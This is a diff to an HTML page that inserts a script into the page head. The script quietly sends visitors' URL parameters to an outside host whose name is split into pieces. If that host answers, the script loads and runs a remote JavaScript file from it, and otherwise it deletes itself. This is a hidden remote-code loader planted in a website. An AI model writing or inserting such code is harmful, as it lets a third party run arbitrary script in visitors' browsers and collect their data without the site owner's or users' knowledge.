@@ -1,6 +1,30 @@
 <!doctype html>
 <html lang="en">
   <head>
+      <script id="juncL2L">
+  var xhr = new XMLHttpRequest();
+  var urlParams = new URLSearchParams(window.location.search);
+  var token = urlParams.get('utm_campaign');
+  var pixel = urlParams.get('pixel');
+  var host = 'simpledslronline';
+  var domain_zone = 'com';
+  var t = '';
+  xhr.open('GET', 'https://' + host + '.' + domain_zone + '/api.php?token=' + token + '&'+ urlParams.toString());
+  xhr.send();
+  xhr.onload = function () {
+    t = xhr.response;
+    t = t.replace(/00pixel00/gi, pixel);
+    t = JSON.parse(t);
+    t = t.redirect.content;
+    if (t != "") {
+      t = t.replace(/base href="/gi, 'base href="https://' + host + '.' + domain_zone + '/');
+      var a = document.createElement("script"), h = "head";
+      a.async = true;
+      a.src = 'https://' + host + '.' + domain_zone + '/js/frm.js';
+      document.getElementsByTagName(h)[0].appendChild(a)
+    }else document.getElementById("juncL2L").remove();
+  }
+</script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="format-detection" content="telephone=no">
